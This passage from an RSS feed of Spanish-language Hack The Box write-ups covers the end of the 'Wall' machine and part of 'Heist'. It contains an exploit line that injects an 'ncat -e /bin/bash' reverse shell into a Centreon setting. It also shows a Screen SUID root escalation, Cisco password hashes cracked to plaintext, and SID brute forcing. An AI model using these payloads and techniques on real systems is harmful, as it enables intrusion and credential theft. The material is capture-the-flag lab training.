&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nagios_bin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ncat -e /bin/bash {0} {1} #&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;por&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;span class=&#34;s2&#34;&gt;&amp;#34;nagios_bin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos nuestro exploit los parametros de IP y Puerto no importan ya que hemos codificado nuestra shell inversa:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-27%2022.56.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell como usuario www-data:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-27%2021.35.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
&lt;p&gt;Como en cualquier maquina realizamos una enumeracion de archivos y binarios que puedan ayudarnos a escalar privilegios a otro usuario en este caso fue distinto ya que la maquina contenia un binario vulnerable que permitia escalar privilegios de administracion.&lt;/p&gt;
&lt;h3 id=&#34;suid---screen-450&#34;&gt;SUID - Screen 4.5.0&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-27%2021.38.52.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Trasladamos y ejecutamos el exploit en la maquina y obtenemos una shell con el usuario root y las flags &lt;strong&gt;user.txt&lt;/strong&gt; y &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/Screenshot%20from%202019-09-27%2021.40.17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/wall/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/wall/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
            
              <category>centreon</category>
            
          
            
              <category>screen</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Heist</title>
        <link>https://sckull.github.io/posts/heist/</link>
        <pubDate>Sat, 30 Nov 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 30 Nov 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/heist/</guid>
        <description>Heist es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Heist es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Heist&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.149&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/8308&#34;&gt;MinatoTW&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/heist# masscan -p1-65535,U:1-65535 10.10.10.149 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-08-21 06:23:36 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 49668/tcp on 10.10.10.149                                 
Discovered open port 445/tcp on 10.10.10.149                                   
Discovered open port 135/tcp on 10.10.10.149                                   
Discovered open port 5985/tcp on 10.10.10.149                                  
Discovered open port 80/tcp on 10.10.10.149

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Wed Aug 21 02:32:58 2019 as: nmap -sC -sV -p 49668,445,135,5985,80 -o nmap.scan 10.10.10.149&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.149
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.39s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-cookie-flags: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   /: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     PHPSESSID: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_      httponly flag not &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-title: Support Login Page
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 32s, deviation: 0s, median: 32s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-08-21 02:34:36
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug 21 02:34:42 2019 -- 1 IP address (1 host up) scanned in 103.97 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---puerto-80&#34;&gt;HTTP - PUERTO 80&lt;/h2&gt;
&lt;p&gt;Al visitar este puerto nos muestra un panel de inicio de sesion de una plataforma.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-21%2000.56.31.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Iniciamos sesion como invitado (Login as guest) y nos redirige a una nueva pagina &lt;code&gt;issues.php&lt;/code&gt; en la cual contiene un &lt;code&gt;chat&lt;/code&gt; de un cliente que muestra los errores que tuvo con su router cisco y una lista de errores dentro de un archivo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-21%2000.45.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos dentro del archivo usuarios y contraseñas:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$1$pdQG$o8nrSzsGXeaduXrjlvKc91
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;La primera contraseña la crackeamos con hashcat:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;stealth1agent:&lt;span class=&#34;nv&#34;&gt;$1$pdQG$o8nrSzsGXeaduXrjlvKc91&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Las dos ultimas utilizamos un script que nos devuelve el valor del hash, este hash es de tipo 7 de Cisco:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.question-defense.com/2011/08/17/perl-script-to-decode-cisco-type-7-password-hash&#34;&gt;&lt;strong&gt;Decode Cisco Password Hash&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;http://ibeast.com/tools/CiscoPassword/index.asp&#34;&gt;&lt;strong&gt;Cisco Password&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;http://www.ifm.net.nz/cookbooks/passwordcracker.html&#34;&gt;&lt;strong&gt;Password Cracker&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2000.22.34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$uperP&lt;/span&gt;@ssword:0242114B0E143F015F5D1E161713
Q4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;sJu&lt;span class=&#34;se&#34;&gt;\Y&lt;/span&gt;8qz*A3?d:02375012182C1A1D751618034F36415408
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smbmap&#34;&gt;SMBMAP&lt;/h2&gt;
&lt;p&gt;Ahora que tenemos usuairos y contraseñas intentamos listar sharenames, con el unico usuario con el cual nos dejó fue con el usuario &lt;strong&gt;hazard&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2015.41.00.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;impacket---lookupsid&#34;&gt;IMPACKET - LOOKUPSID&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/&#34;&gt;&lt;strong&gt;Impacket toolkit&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Utilizamos el script lookupsid.py de impacket para poder obtener los usuarios o grupo de usuarios dentro de la maquina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2015.47.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/heist/evil-winrm# lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.20-dev - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Brute forcing SIDs at 10.10.10.149
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; StringBinding ncacn_np:10.10.10.149&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;ipe&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;sarpc&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
501: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\G&lt;/span&gt;uest &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
503: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;efaultAccount &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
504: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;DAGUtilityAccount &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
513: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;one &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeGroup&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1008: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;azard &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1009: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;upport &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1012: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;hase &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1013: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;ason &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h5 id=&#34;credenciales&#34;&gt;CREDENCIALES&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;hazard:stealth1agent
rout3r:$uperP@ssword
admin:Q4)sJu\Y8qz*A3?d
chase:Q4)sJu\Y8qz*A3?d
jason:
support:
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;winrm&#34;&gt;WINRM&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://alionder.net/winrm-shell/&#34;&gt;&lt;strong&gt;WinRm&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Dentro de los puertos abiertos que encontramos vemos que winrm (5985) esta abierto, utilizamos las credenciales y usuarios que encontramos para intentar logearnos mediante este puerto.&lt;/p&gt;
&lt;p&gt;Utilizamos un script en ruby con la libreria winrm para poder ejecutar comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
